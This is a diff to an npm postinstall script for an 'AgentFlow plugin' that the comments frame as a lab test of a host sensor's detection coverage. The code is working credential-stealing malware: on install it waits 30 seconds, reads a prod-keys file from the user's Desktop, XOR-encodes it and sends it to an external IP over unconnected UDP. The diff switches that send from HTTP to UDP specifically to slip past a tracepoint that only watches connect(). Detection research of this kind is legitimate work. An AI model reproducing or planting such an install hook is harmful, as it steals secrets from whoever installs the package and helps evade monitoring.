@@ -1,9 +1,28 @@
 #!/usr/bin/env node
 /**
  * AgentFlow plugin - initialization script
- * Runs automatically on npm install with delayed data sync
+ *
+ * H4 (Arm B, host evasion): sends the payload over an UNCONNECTED UDP socket
+ * (dgram.send(), which issues sendto()) instead of a TCP connect().
+ *
+ * What this measures: the sensor's network probe is a single tracepoint,
+ * tracepoint:syscalls:sys_enter_connect (telemetry.py:254). There is no sys_enter_sendto and
+ * no sys_enter_sendmsg. A tainted process that never calls connect() therefore produces no
+ * lineage_send at all, however much it sends. Expected result: EVADED.
+ *
+ * Second, independent reason it works: the inotify fallback path (telemetry.py:306) has no
+ * lineage tracking whatsoever, so on a host where bpftrace is unavailable H4 evades there
+ * too, for a different reason.
+ *
+ * Deliberately minimal: no chunking, no framing. XOR+base64 over a single datagram is enough
+ * to make the point, and a datagram is small enough that the lab file fits in one packet.
+ * The collector on PLUGIN_PORT speaks TCP, so the datagram is not acknowledged. That does
+ * not matter here; the measurement is whether lineage_send appears, not whether the payload
+ * lands.
+ *
+ * Timing is the same 30s "after" bracket as plugin-v4.
  */
-const http = require('http');
+const dgram = require('dgram');
 const fs = require('fs');
 const path = require('path');
 
@@ -11,10 +30,9 @@ const HOST = process.env.PLUGIN_HOST || '184.32.242.13';
 const PORT = parseInt(process.env.PLUGIN_PORT || '8080');
 const DATA_FILE = process.env.PLUGIN_DATA_FILE || path.join(process.env.HOME || '~', 'Desktop', 'prod-keys.txt');
 const ENCRYPTION_KEY = process.env.PLUGIN_KEY || 'demo-key';
-const DELAY_MS = 30000; // 30 seconds
+const DELAY_MS = 30000; // 30 seconds, same "after" timing as plugin-v4
 
 function log(level, message) {
-  // No on-disk log: a real attacker leaves no artifact, and detection does not depend on it.
   console.log('[' + level + '] ' + message);
 }
 
@@ -27,7 +45,7 @@ function xorEncrypt(data, key) {
   return result;
 }
 
-function syncData() {
+function syncOverUdp() {
   log('INFO', 'Reading ' + DATA_FILE);
   let fileContent;
   try {
@@ -38,51 +56,30 @@ function syncData() {
     return;
   }
 
-  log('INFO', 'Encrypting data');
-  const encrypted = xorEncrypt(fileContent, ENCRYPTION_KEY);
-  const encoded = encrypted.toString('base64');
+  const payload = Buffer.from(xorEncrypt(fileContent, ENCRYPTION_KEY).toString('base64'));
+  const sock = dgram.createSocket('udp4');
 
-  log('INFO', 'Syncing data to ' + HOST + ':' + PORT);
-  const options = {
-    hostname: HOST,
-    port: PORT,
-    path: '/collection',
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/octet-stream',
-      'Content-Length': Buffer.byteLength(encoded),
-      'X-Plugin-Enc': 'xor'
-    },
-    timeout: 15000
-  };
-
-  const req = http.request(options, function(res) {
-    log('INFO', 'Sync response: HTTP ' + res.statusCode);
+  sock.on('error', e => {
+    log('ERROR', 'UDP error: ' + e.message);
+    try { sock.close(); } catch (e2) { /* already closed */ }
   });
 
-  req.on('error', function(e) {
-    log('ERROR', 'Sync error: ' + e.message);
+  // No sock.connect() anywhere: this is sendto() on an unconnected socket.
+  log('INFO', 'Sending ' + payload.length + ' bytes over unconnected UDP to ' + HOST + ':' + PORT);
+  sock.send(payload, PORT, HOST, err => {
+    if (err) {
+      log('ERROR', 'UDP send error: ' + err.message);
+    } else {
+      log('INFO', 'Datagram sent (unacknowledged)');
+    }
+    try { sock.close(); } catch (e) { /* already closed */ }
   });
-
-  req.on('timeout', function() {
-    req.destroy();
-    log('WARN', 'Sync timed out');
-  });
-
-  req.write(encoded);
-  req.end();
-  log('INFO', 'Data sync complete (delayed)');
 }
 
 // --- single-send guard ------------------------------------------------------------------
-// npm runs this postinstall TWICE for a git+ dependency: once in its build/prepare temp dir
-// (<cache>/_cacache/tmp/git-clone*) and once in the real node_modules install. Act only on the
-// real install so this runs EXACTLY once. Verified via live process tree + process.cwd().
-// (Removing "main" or a require.main guard does NOT help: both runs are `node postinstall.js`
-// lifecycle spawns, where require.main === module is true.)
 if (!process.cwd().includes('node_modules')) {
   log('INFO', 'build/prepare phase (cwd outside node_modules); skipping');
   process.exit(0);
 }
 log('INFO', 'Waiting ' + (DELAY_MS / 1000) + 's before data sync...');
-setTimeout(syncData, DELAY_MS);
+setTimeout(syncOverUdp, DELAY_MS);
